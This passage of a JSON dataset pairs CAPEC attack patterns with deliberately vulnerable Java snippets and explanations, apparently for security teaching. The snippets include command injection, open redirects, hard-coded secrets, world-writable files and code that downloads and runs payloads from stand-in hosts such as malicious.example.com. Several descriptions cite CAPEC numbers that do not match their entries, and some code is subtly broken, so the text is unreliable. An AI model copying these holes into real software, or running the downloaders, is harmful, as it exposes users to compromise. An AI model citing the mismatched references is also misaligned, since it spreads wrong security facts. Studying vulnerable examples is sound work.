        "code_snippet": "import java.io.FileInputStream;\nimport java.io.IOException;\nimport java.util.Properties;\n\npublic class ConfigManipulation {\n    private Properties config;\n\n    public ConfigManipulation(String configFilePath) throws IOException {\n        config = new Properties();\n        try (FileInputStream fis = new FileInputStream(configFilePath)) {\n            config.load(fis);\n        }\n    }\n\n    public String getConfigValue(String key) {\n        return config.getProperty(key);\n    }\n\n    public void setConfigValue(String key, String value) throws IOException {\n        config.setProperty(key, value);\n        // Save the properties back to the file (vulnerable to external manipulation)\n        try (FileOutputStream fos = new FileOutputStream(\"config.properties\")) {\n            config.store(fos, null);\n        }\n    }\n\n    public static void main(String[] args) {\n        try {\n            ConfigManipulation cm = new ConfigManipulation(\"config.properties\");\n            System.out.println(\"Initial Config: \" + cm.getConfigValue(\"setting1\"));\n            cm.setConfigValue(\"setting1\", \"new_value\");\n            System.out.println(\"Updated Config: \" + cm.getConfigValue(\"setting1\"));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple configuration manipulation scenario. The `ConfigManipulation` class loads configuration settings from an external file (`config.properties`). The `setConfigValue` method allows updating the configuration and saving it back to the file. This setup is vulnerable to external manipulation (CWE-15) because the configuration file can be modified by an attacker, affecting the application's behavior. The code does not implement any security measures to protect the integrity of the configuration file, making it susceptible to attacks described in the CAPEC."
    },
    {
        "capec_id": "177",
        "capec_name": "Create files with the same name as files protected with a higher classification",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class VulnerableFileLoader {\n    public static void main(String[] args) {\n        String fileName = \"config.properties\";\n        String[] searchPaths = {\"./\", \"/etc/app/\", \"/usr/local/app/\"};\n        FileInputStream fis = null;\n\n        for (String path : searchPaths) {\n            File file = new File(path + fileName);\n            if (file.exists()) {\n                try {\n                    fis = new FileInputStream(file);\n                    System.out.println(\"Loaded file from: \" + file.getAbsolutePath());\n                    break;\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n\n        if (fis == null) {\n            System.out.println(\"File not found.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable file loading mechanism. The program attempts to load a configuration file named 'config.properties' from a list of predefined directories. The vulnerability arises because the code searches directories in a specific order and loads the first file it finds with the matching name. An attacker could exploit this by placing a malicious 'config.properties' file in a directory that is searched before the legitimate file's directory. This could lead to the application loading and executing the attacker's file instead of the intended one. The code embodies the main idea of the CAPEC by showing how an attacker can manipulate file location algorithms to substitute a malicious file for a protected one. The related CWEs provide additional context on the types of weaknesses that can lead to this vulnerability, such as reliance on file names and paths, and incorrect resolution of names or references."
    },
    {
        "capec_id": "178",
        "capec_name": "Cross-Site Flashing",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class FlashRedirectServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String targetUrl = request.getParameter(\"targetUrl\");\n        String flashFile = request.getParameter(\"flashFile\");\n\n        // CWE-601: URL Redirection to Untrusted Site\n        if (targetUrl != null && !targetUrl.isEmpty()) {\n            response.sendRedirect(targetUrl);\n            return;\n        }\n\n        // CWE-79: Cross-site Scripting (XSS)\n        if (flashFile != null && !flashFile.isEmpty()) {\n            response.setContentType(\"application/x-shockwave-flash\");\n            response.getWriter().write(\"<embed src='\" + flashFile + \"' />\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable implementation that embodies the main idea of the CAPEC 'Cross-Site Flashing'. The servlet takes two parameters from the HTTP request: 'targetUrl' and 'flashFile'. If 'targetUrl' is provided, it redirects the user to that URL, which is an example of CWE-601 (URL Redirection to Untrusted Site). If 'flashFile' is provided, it embeds the Flash file in the response without proper validation or sanitization, which can lead to CWE-79 (Cross-site Scripting). This code snippet highlights how an attacker could exploit these vulnerabilities to execute arbitrary Flash content in the user's browser, potentially leading to further attacks."
    },
    {
        "capec_id": "179",
        "capec_name": "Calling Micro-Services Directly",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.Cookie;\n\n@WebServlet(\"/microservice\")\npublic class MicroserviceServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // CWE-598: Sensitive information in query string\n        String sensitiveData = request.getParameter(\"sensitiveData\");\n        \n        // CWE-602: Client-side enforcement of server-side security\n        if (request.getParameter(\"authToken\") == null) {\n            response.sendError(HttpServletResponse.SC_UNAUTHORIZED, \"Unauthorized access\");\n            return;\n        }\n        \n        // CWE-539: Use of persistent cookies containing sensitive information\n        Cookie sensitiveCookie = new Cookie(\"authToken\", request.getParameter(\"authToken\"));\n        sensitiveCookie.setMaxAge(60 * 60 * 24 * 7); // 1 week\n        response.addCookie(sensitiveCookie);\n        \n        // CWE-219: Storage of sensitive data under web root\n        String filePath = getServletContext().getRealPath(\"/sensitiveData.txt\");\n        \n        // CWE-433: Unparsed raw web content delivery\n        response.setContentType(\"text/plain\");\n        response.getWriter().write(\"Sensitive Data: \" + sensitiveData);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates several vulnerabilities related to the CAPEC 'Calling Micro-Services Directly'. The servlet exposes a microservice endpoint '/microservice' that processes sensitive data. It includes the following vulnerabilities:\n\n1. CWE-598: Sensitive information is passed in the query string (e.g., 'sensitiveData').\n2. CWE-602: The servlet relies on a client-provided 'authToken' parameter for authentication, which can be easily manipulated.\n3. CWE-539: The servlet sets a persistent cookie containing sensitive information ('authToken').\n4. CWE-219: Sensitive data is stored under the web root directory ('/sensitiveData.txt').\n5. CWE-433: The servlet delivers raw content without proper parsing or validation.\n\nThese vulnerabilities illustrate how an attacker could discover and exploit microservices by gathering information about their implementation and function, leading to potential security breaches."
    },
    {
        "capec_id": "180",
        "capec_name": "Exploiting Incorrectly Configured Access Control Security Levels",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class AccessControlMisconfiguration {\n    public static void main(String[] args) {\n        // Incorrectly configured access control: sensitive file with improper permissions\n        File sensitiveFile = new File(\"/path/to/sensitive/file.txt\");\n        try {\n            if (!sensitiveFile.exists()) {\n                sensitiveFile.createNewFile();\n            }\n            // CWE-732: Incorrect Permission Assignment for Critical Resource\n            sensitiveFile.setReadable(true, false); // Readable by everyone\n            sensitiveFile.setWritable(true, false); // Writable by everyone\n\n            // Writing sensitive data to the file\n            FileWriter writer = new FileWriter(sensitiveFile);\n            writer.write(\"Sensitive Information\");\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a misconfiguration of access control by setting incorrect permissions on a sensitive file. The file is made readable and writable by everyone, which is a security risk (CWE-732: Incorrect Permission Assignment for Critical Resource). This misconfiguration allows unauthorized users to access and modify the sensitive file, embodying the main idea of the CAPEC: 'Exploiting Incorrectly Configured Access Control Security Levels'. The code highlights how improper permission settings can lead to unauthorized access and potential exploitation."
    },
    {
        "capec_id": "181",
        "capec_name": "Flash File Overlay",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\npublic class FlashOverlayServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n\n        // Vulnerable code: Embedding a Flash file overlay\n        out.println(\"<html>\");\n        out.println(\"<head><title>Flash Overlay Example</title></head>\");\n        out.println(\"<body>\");\n        out.println(\"<div style='position:relative;'>\");\n        out.println(\"<iframe src='https://trusted-site.com' style='width:100%; height:100%;'></iframe>\");\n        out.println(\"<object type='application/x-shockwave-flash' data='overlay.swf' style='position:absolute; top:0; left:0; width:100%; height:100%; opacity:0.0;'></object>\");\n        out.println(\"</div>\");\n        out.println(\"</body>\");\n        out.println(\"</html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerable implementation of a Flash file overlay, which can be used for a clickjacking attack. The servlet generates an HTML page that includes an iframe displaying content from a trusted site. On top of this iframe, a transparent Flash object is placed, which intercepts user actions such as clicks. This setup can mislead users into interacting with the Flash overlay instead of the underlying content, allowing an attacker to perform unintended actions. The code also touches on related CWEs by not restricting frame objects (CWE-1021), potentially allowing cross-domain interactions (CWE-942), and embedding a Flash file (CWE-434)."
    },
    {
        "capec_id": "182",
        "capec_name": "Flash Injection",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class FlashInjectionExample extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String flashContentUrl = request.getParameter(\"flashUrl\");\n        if (flashContentUrl != null && !flashContentUrl.isEmpty()) {\n            // CWE-20: Improper Input Validation\n            if (!flashContentUrl.matches(\"^https?://[\\w.-]+/.*\\.swf$\")) {\n                response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid flash URL\");\n                return;\n            }\n            // CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n            response.setContentType(\"application/x-shockwave-flash\");\n            response.getWriter().write(\"<embed src='\" + flashContentUrl + \"' />\");\n        } else {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Missing flash URL\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a potential Flash Injection vulnerability. The servlet takes a 'flashUrl' parameter from the HTTP request and embeds it into the response as Flash content. The code attempts to validate the URL using a regular expression, but this validation is insufficient (CWE-20: Improper Input Validation). Additionally, the code does not properly restrict the domains from which Flash content can be loaded (CWE-942: Permissive Cross-domain Policy with Untrusted Domains). An attacker could exploit this by providing a malicious Flash URL, leading to the execution of harmful Flash content in the victim's browser."
    },
    {
        "capec_id": "183",
        "capec_name": "IMAP/SMTP Command Injection",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class WebMailServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userCommand = request.getParameter(\"command\");\n        String email = request.getParameter(\"email\");\n\n        // Vulnerable: No input validation or sanitization\n        String imapCommand = \"IMAP FETCH \" + userCommand + \" FROM \" + email;\n\n        // Execute the command on the IMAP server\n        ProcessBuilder processBuilder = new ProcessBuilder(\"/bin/sh\", \"-c\", imapCommand);\n        Process process = processBuilder.start();\n\n        // Capture the output and send it back to the user\n        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        StringBuilder output = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            output.append(line).append(\"\\n\");\n        }\n\n        // Send the response back to the user\n        response.setContentType(\"text/plain\");\n        response.getWriter().write(output.toString());\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable implementation of an IMAP command injection attack. The servlet receives user input via HTTP POST parameters without proper validation or sanitization. The 'userCommand' parameter is directly embedded into an IMAP command string, which is then executed on the IMAP server using a ProcessBuilder. This approach exposes the system to command injection attacks (CWE-77) because special elements in the user input are not neutralized. Additionally, the code does not properly encode or escape the output (CWE-116), and it may expose sensitive information through error messages (CWE-535, CWE-209). The code also relies on client-side input for server-side security (CWE-602), making it highly vulnerable to exploitation."
    },
    {
        "capec_id": "184",
        "capec_name": "Software Integrity Attack",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableDownloader {\n    public static void main(String[] args) {\n        String url = \"http://example.com/malicious-code.jar\";\n        try {\n            downloadAndExecute(url);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void downloadAndExecute(String url) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException {\n        URL website = new URL(url);\n        try (InputStream in = website.openStream(); FileOutputStream fos = new FileOutputStream(\"downloaded.jar\")) {\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n        }\n        URLClassLoader classLoader = new URLClassLoader(new URL[]{new File(\"downloaded.jar\").toURI().toURL()});\n        Class<?> clazz = classLoader.loadClass(\"MaliciousClass\");\n        clazz.newInstance();\n    }\n}",
        "description": "This Java code snippet demonstrates a software integrity attack by downloading and executing code from a remote location without verifying its origin or integrity (CWE-494). The `downloadAndExecute` method downloads a JAR file from a specified URL and executes a class named `MaliciousClass` from the downloaded JAR. This represents a scenario where an attacker could embed malicious code (CWE-506) into the downloaded file. The code does not perform any integrity checks, making it vulnerable to attacks that could compromise the software's integrity."
    },
    {
        "capec_id": "185",
        "capec_name": "Malicious Software Download",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousDownloader {\n    public static void main(String[] args) {\n        String url = \"http://malicious.example.com/malware.exe\";\n        String fileName = \"malware.exe\";\n        try {\n            downloadFile(url, fileName);\n            executeFile(fileName);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void downloadFile(String url, String fileName) throws IOException {\n        try (BufferedInputStream in = new BufferedInputStream(new URL(url).openStream());\n             FileOutputStream fileOutputStream = new FileOutputStream(fileName)) {\n            byte dataBuffer[] = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {\n                fileOutputStream.write(dataBuffer, 0, bytesRead);\n            }\n        }\n    }\n\n    public static void executeFile(String fileName) throws IOException {\n        Runtime.getRuntime().exec(fileName);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application that downloads and executes a file from a remote location without verifying its integrity or origin. The `downloadFile` method downloads a file from a specified URL and saves it locally. The `executeFile` method then executes the downloaded file. This code is vulnerable to CWE-494 (Download of Code Without Integrity Check) as it does not verify the integrity or authenticity of the downloaded file. It also embodies the concept of CAPEC-193 (Malicious Software Download) by potentially allowing an attacker to trick the user into downloading and executing malicious software. The code could also be used to illustrate CWE-506 (Embedded Malicious Code) and CWE-507 (Trojan Horse) if the downloaded file contains hidden malicious functionality."
    },
    {
        "capec_id": "186",
        "capec_name": "Malicious Software Update",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousUpdate {\n    public static void main(String[] args) {\n        try {\n            // URL of the update file (potentially malicious)\n            URL url = new URL(\"http://example.com/update.jar\");\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            // Download the update file without integrity check\n            InputStream in = connection.getInputStream();\n            FileOutputStream out = new FileOutputStream(\"update.jar\");\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n            in.close();\n            out.close();\n\n            // Execute the downloaded file\n            Process process = Runtime.getRuntime().exec(\"java -jar update.jar\");\n            process.waitFor();\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a software update is downloaded and executed without verifying its integrity or origin. The code fetches an update file from a specified URL and saves it locally. It then executes the downloaded file. This process embodies the CAPEC 'Malicious Software Update' by showing how an adversary could trick a user or system into downloading and running malicious code. The code lacks integrity checks (CWE-494), potentially contains embedded malicious code (CWE-506), and could execute a Trojan horse (CWE-507)."
    },
    {
        "capec_id": "187",
        "capec_name": "Malicious Automated Software Update via Redirection",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableUpdater {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/update\"); // CWE-494: Download of Code Without Integrity Check\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            InputStream in = connection.getInputStream();\n            FileOutputStream out = new FileOutputStream(\"update.jar\");\n\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n\n            in.close();\n            out.close();\n\n            // Execute the downloaded update\n            Runtime.getRuntime().exec(\"java -jar update.jar\"); // CWE-494: Executing code without verifying integrity\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable software update mechanism. The code downloads an update from a specified URL and executes it without verifying the origin or integrity of the downloaded file. This embodies the main idea of CAPEC-494, where an attacker can exploit the lack of proper authentication and integrity checks to introduce malicious code. The code also touches on CWE-494 by downloading and executing code without integrity checks, making it susceptible to malicious updates."
    },
    {
        "capec_id": "188",
        "capec_name": "Reverse Engineering",
        "code_snippet": "import java.security.Key;\nimport javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\nimport java.util.Base64;\n\npublic class VulnerableEncryption {\n    private static final String ALGORITHM = \"DES\"; // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n    private static final byte[] KEY = \"12345678\".getBytes(); // Hardcoded key, susceptible to reverse engineering\n\n    public static String encrypt(String data) throws Exception {\n        Key key = new SecretKeySpec(KEY, ALGORITHM);\n        Cipher cipher = Cipher.getInstance(ALGORITHM);\n        cipher.init(Cipher.ENCRYPT_MODE, key);\n        byte[] encryptedData = cipher.doFinal(data.getBytes());\n        return Base64.getEncoder().encodeToString(encryptedData);\n    }\n\n    public static String decrypt(String encryptedData) throws Exception {\n        Key key = new SecretKeySpec(KEY, ALGORITHM);\n        Cipher cipher = Cipher.getInstance(ALGORITHM);\n        cipher.init(Cipher.DECRYPT_MODE, key);\n        byte[] decodedData = Base64.getDecoder().decode(encryptedData);\n        byte[] decryptedData = cipher.doFinal(decodedData);\n        return new String(decryptedData);\n    }\n\n    public static void main(String[] args) throws Exception {\n        String data = \"Sensitive Information\";\n        String encryptedData = encrypt(data);\n        System.out.println(\"Encrypted: \" + encryptedData);\n        String decryptedData = decrypt(encryptedData);\n        System.out.println(\"Decrypted: \" + decryptedData);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable encryption mechanism that embodies the main idea of reverse engineering (CAPEC-170). The code uses the DES algorithm (CWE-327: Use of a Broken or Risky Cryptographic Algorithm), which is considered weak and susceptible to attacks. Additionally, the encryption key is hardcoded in the source code, making it easy for an attacker to reverse engineer the application and retrieve the key (CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere). This example highlights how improper cryptographic practices and hardcoded sensitive information can lead to vulnerabilities that can be exploited through reverse engineering techniques."
    },
    {
        "capec_id": "189",
        "capec_name": "Black Box Reverse Engineering",
        "code_snippet": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class BlackBoxServer {\n    private static final String SECRET_KEY = \"SuperSecretKey123\";\n\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server is listening on port 8080\");\n\n        while (true) {\n            Socket socket = serverSocket.accept();\n            new Thread(new ClientHandler(socket)).start();\n        }\n    }\n\n    private static class ClientHandler implements Runnable {\n        private Socket socket;\n\n        public ClientHandler(Socket socket) {\n            this.socket = socket;\n        }\n\n        @Override\n        public void run() {\n            try (InputStream input = socket.getInputStream()) {\n                byte[] buffer = new byte[1024];\n                int bytesRead = input.read(buffer);\n                String received = new String(buffer, 0, bytesRead);\n\n                if (received.equals(SECRET_KEY)) {\n                    socket.getOutputStream().write(\"Access Granted\".getBytes());\n                } else {\n                    socket.getOutputStream().write(\"Access Denied\".getBytes());\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple server that listens for incoming connections on port 8080. The server checks if the received input matches a hardcoded secret key ('SuperSecretKey123'). If the input matches, it responds with 'Access Granted'; otherwise, it responds with 'Access Denied'. This code embodies the main idea of CAPEC-163 (Black Box Reverse Engineering) by exposing a potential vulnerability where an adversary can interact with the software at its boundaries (input-output vectors) to infer sensitive information. The related CWEs are represented as follows:\n\n1. CWE-203 (Observable Discrepancy): The server's different responses ('Access Granted' vs. 'Access Denied') can be observed by an unauthorized actor, revealing information about the secret key's correctness.\n2. CWE-1255 (Comparison Logic is Vulnerable to Power Side-Channel Attacks): The comparison logic of the secret key could be vulnerable to power side-channel attacks if an adversary monitors the power consumption during the evaluation.\n3. CWE-1300 (Improper Protection of Physical Side Channels): The server does not implement any protection mechanisms against physical side channels, making it susceptible to attacks based on power consumption or electromagnetic emissions.\n4. CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere): The server exposes sensitive information (whether the secret key is correct) to unauthorized actors.\n5. CWE-506 (Embedded Malicious Code): Although not directly represented in this snippet, the concept of embedded malicious code could be explored further by considering how an adversary might inject or exploit such code during reverse engineering."
    },
    {
        "capec_id": "190",
        "capec_name": "Reverse Engineer an Executable to Expose Assumed Hidden Functionality",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\n\npublic class HiddenFunctionality {\n    public static void main(String[] args) {\n        try {\n            // Hidden functionality: Download and execute code without integrity check\n            String url = \"http://example.com/malicious.jar\";\n            Runtime.getRuntime().exec(\"wget \" + url + \" -O /tmp/malicious.jar\");\n            Runtime.getRuntime().exec(\"java -jar /tmp/malicious.jar\");\n\n            // Hidden functionality: Expose sensitive system information\n            File file = new File(\"/etc/passwd\");\n            FileInputStream fis = new FileInputStream(file);\n            byte[] data = new byte[(int) file.length()];\n            fis.read(data);\n            fis.close();\n            String content = new String(data, \"UTF-8\");\n            System.out.println(\"Sensitive Data: \" + content);\n\n            // Hidden functionality: Improper management of sensitive trace data\n            String traceData = \"Sensitive Trace Data\";\n            File traceFile = new File(\"/tmp/trace.log\");\n            java.nio.file.Files.write(traceFile.toPath(), traceData.getBytes());\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    // Hidden functionality: Embedded malicious code\n    private static void maliciousCode() {\n        System.out.println(\"Executing malicious code...\");\n        // Malicious actions here\n    }\n\n    // Hidden functionality: Calculate hash without integrity check\n    private static String calculateHash(String filePath) throws NoSuchAlgorithmException, IOException {\n        MessageDigest digest = MessageDigest.getInstance(\"SHA-256\");\n        FileInputStream fis = new FileInputStream(filePath);\n        byte[] byteArray = new byte[1024];\n        int bytesCount = 0;\n\n        while ((bytesCount = fis.read(byteArray)) != -1) {\n            digest.update(byteArray, 0, bytesCount);\n        }\n        fis.close();\n\n        byte[] bytes = digest.digest();\n        StringBuilder sb = new StringBuilder();\n        for (byte b : bytes) {\n            sb.append(String.format(\"%02x\", b));\n        }\n        return sb.toString();\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to the CAPEC 'Reverse Engineer an Executable to Expose Assumed Hidden Functionality' and associated CWEs. The code includes hidden functionalities such as downloading and executing code without integrity checks (CWE-494), exposing sensitive system information (CWE-497), improper management of sensitive trace data (CWE-1323), and embedded malicious code (CWE-506). These hidden functionalities are not documented or obvious to users, making the software susceptible to reverse engineering and exploitation."
    },
    {
        "capec_id": "191",
        "capec_name": "Read Sensitive Constants Within an Executable",
        "code_snippet": "public class SensitiveDataHandler {\n    // CWE-798: Hard-coded credentials\n    private static final String HARD_CODED_PASSWORD = \"P@ssw0rd123\";\n    \n    // CWE-547: Hard-coded security-relevant constant\n    private static final String SECRET_KEY = \"s3cr3tK3y\";\n    \n    // CWE-318: Cleartext storage of sensitive information\n    private static final String API_TOKEN = \"12345-ABCDE\";\n    \n    public static void main(String[] args) {\n        // Simulate usage of hard-coded sensitive data\n        System.out.println(\"Using hard-coded password: \" + HARD_CODED_PASSWORD);\n        System.out.println(\"Using hard-coded secret key: \" + SECRET_KEY);\n        System.out.println(\"Using hard-coded API token: \" + API_TOKEN);\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Read Sensitive Constants Within an Executable' (CAPEC) by including hard-coded sensitive information directly within the source code. The constants `HARD_CODED_PASSWORD`, `SECRET_KEY`, and `API_TOKEN` are examples of sensitive data that are hard-coded into the executable, making them vulnerable to discovery through static or dynamic analysis. This snippet embodies several related CWEs: CWE-798 (Use of Hard-coded Credentials), CWE-547 (Use of Hard-coded, Security-relevant Constants), and CWE-318 (Cleartext Storage of Sensitive Information in Executable). The code highlights the risks associated with embedding sensitive information directly in the code, which can be easily extracted by an adversary."
    },
    {
        "capec_id": "192",
        "capec_name": "Protocol Analysis",
        "code_snippet": "import java.io.*;\nimport java.net.*;\nimport javax.crypto.*;\nimport javax.crypto.spec.SecretKeySpec;\n\npublic class VulnerableProtocol {\n    private static final String ALGORITHM = \"AES\";\n    private static final String TRANSFORMATION = \"AES/ECB/PKCS5Padding\";\n    private static final String KEY = \"1234567890123456\"; // Inadequate Encryption Strength\n\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            Socket clientSocket = serverSocket.accept();\n            DataInputStream in = new DataInputStream(clientSocket.getInputStream());\n            DataOutputStream out = new DataOutputStream(clientSocket.getOutputStream());\n\n            // Cleartext Transmission of Sensitive Information\n            String receivedData = in.readUTF();\n            System.out.println(\"Received: \" + receivedData);\n\n            // Encrypt data with weak key\n            String encryptedData = encrypt(receivedData, KEY);\n            out.writeUTF(encryptedData);\n            System.out.println(\"Sent: \" + encryptedData);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static String encrypt(String data, String key) throws Exception {\n        Cipher cipher = Cipher.getInstance(TRANSFORMATION);\n        SecretKeySpec secretKey = new SecretKeySpec(key.getBytes(), ALGORITHM);\n        cipher.init(Cipher.ENCRYPT_MODE, secretKey);\n        byte[] encryptedBytes = cipher.doFinal(data.getBytes());\n        return new String(encryptedBytes);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable protocol implementation that embodies the main idea of CAPEC-272 (Protocol Analysis). The code sets up a simple server that accepts a connection and reads data in cleartext (CWE-319). It then encrypts the data using a weak encryption key (CWE-326) and sends the encrypted data back to the client. The use of a weak encryption key makes the encryption inadequate for protecting sensitive information, and the cleartext transmission of data makes it susceptible to interception by unauthorized actors. This example highlights the risks associated with inadequate encryption strength and cleartext transmission in network protocols."
    },
    {
        "capec_id": "193",
        "capec_name": "PHP Remote File Inclusion",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"file\");\n        if (fileName != null) {\n            try {\n                File file = new File(\"/var/www/html/\" + fileName);\n                BufferedReader reader = new BufferedReader(new FileReader(file));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.getWriter().println(line);\n                }\n                reader.close();\n            } catch (FileNotFoundException e) {\n                response.getWriter().println(\"File not found\");\n            }\n        } else {\n            response.getWriter().println(\"No file specified\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability similar to PHP Remote File Inclusion (RFI) but in a Java context. The servlet reads a file name from a request parameter and attempts to read and output the file's contents. This code is vulnerable to CWE-98 (Improper Control of Filename for Include/Require Statement) because it does not properly validate or sanitize the 'file' parameter, allowing an attacker to potentially access sensitive files on the server. Additionally, it touches on CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) by relying on the file name provided by the user without proper validation. The code also indirectly relates to CWE-553 (Command Shell in Externally Accessible Directory) as it could be exploited to read and execute shell scripts if they are accessible."
    },
    {
        "capec_id": "194",
        "capec_name": "Fake the Source of Data",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class VulnerableServer {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            System.out.println(\"Server is listening on port 8080\");\n\n            while (true) {\n                Socket socket = serverSocket.accept();\n                BufferedReader input = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n                String message = input.readLine();\n\n                // Improper Authentication: No verification of the sender's identity\n                System.out.println(\"Received message: \" + message);\n\n                // Process the message without verifying its source\n                if (message.startsWith(\"ADMIN:\")) {\n                    System.out.println(\"Performing admin action: \" + message.substring(6));\n                } else {\n                    System.out.println(\"Performing user action: \" + message);\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple server that listens for incoming connections on port 8080. When a message is received, it processes the message without verifying the sender's identity. This embodies the main idea of the CAPEC 'Fake the Source of Data' by demonstrating improper authentication (CWE-287) and improper verification of the source of a communication channel (CWE-940). The server assumes the message is from a trusted source and performs actions based on the message content, which could lead to privilege escalation or other malicious activities if an attacker sends a falsified message."
    },
    {
        "capec_id": "195",
        "capec_name": "Principal Spoof",
        "code_snippet": "import java.util.Scanner;\n\npublic class PrincipalSpoofExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter password: \");\n        String password = scanner.nextLine();\n\n        // Simulate a weak authentication mechanism\n        if (authenticate(username, password)) {\n            System.out.println(\"Welcome, \" + username + \"!\");\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // Weak authentication: simply checks if username is 'admin'\n        // and password is 'password123'\n        return \"admin\".equals(username) && \"password123\".equals(password);\n    }\n}\n",
